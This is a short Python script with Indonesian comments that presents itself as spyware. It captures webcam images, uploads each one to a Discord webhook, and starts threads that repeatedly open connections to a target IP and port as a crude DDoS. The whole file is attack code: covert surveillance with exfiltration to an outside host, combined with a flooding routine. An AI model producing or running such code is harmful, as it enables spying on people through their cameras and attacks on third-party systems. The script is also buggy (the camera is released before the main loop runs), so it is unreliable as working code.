import cv2
import os
import datetime
import requests
import socket
import threading
import sys

# URL webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_url"

# Inisialisasi kamera
camera = cv2.VideoCapture(0)

# Fungsi untuk melakukan serangan DDoS
def ddos_attack(target_ip, target_port):
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.send(b"Spyware DDoS Attack")
        sock.close()

# Fungsi utama
def main(target_ip, target_port):
    while True:
        # Baca frame dari kamera
        ret, frame = camera.read()
        
        # Tangkap gambar
        cv2.imwrite("spyware_screenshot.jpg", frame)
        
        # Tampilkan gambar yang diambil
        cv2.imshow("Spyware Screenshot", frame)
        
        # Kirim gambar melalui webhook Discord
        with open("spyware_screenshot.jpg", "rb") as image_file:
            payload = {"content": "Spyware screenshot captured!"}
            files = {"image": image_file}
            requests.post(WEBHOOK_URL, data=payload, files=files)
        
        # Jalankan serangan DDoS
        thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port))
        thread.start()
        
        # Tunggu tombol 'q' untuk keluar
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

# Hapus objek kamera dan tutup jendela
camera.release()
cv2.destroyAllWindows()

# Jalankan fungsi utama dengan argumen command line
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python main.py <target_ip> <target_port>")
    else:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
        main(target_ip, target_port)
